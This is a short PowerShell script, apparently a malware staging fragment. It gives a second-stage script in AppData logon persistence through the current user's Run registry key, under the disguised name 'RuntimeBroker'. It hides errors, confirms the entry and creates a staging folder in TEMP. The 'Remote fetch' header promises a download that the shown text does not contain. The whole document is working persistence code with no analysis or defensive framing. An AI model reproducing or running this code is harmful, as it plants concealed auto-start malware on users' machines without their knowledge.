<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$PersistencePath = "$env:APPDATA\stage2.ps1",
    [string]$RegistryValue = 'RuntimeBroker'
)
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RegistryValue -Value $PersistencePath -PropertyType String -Force -ErrorAction SilentlyContinue
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RegistryValue -ErrorAction SilentlyContinue
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
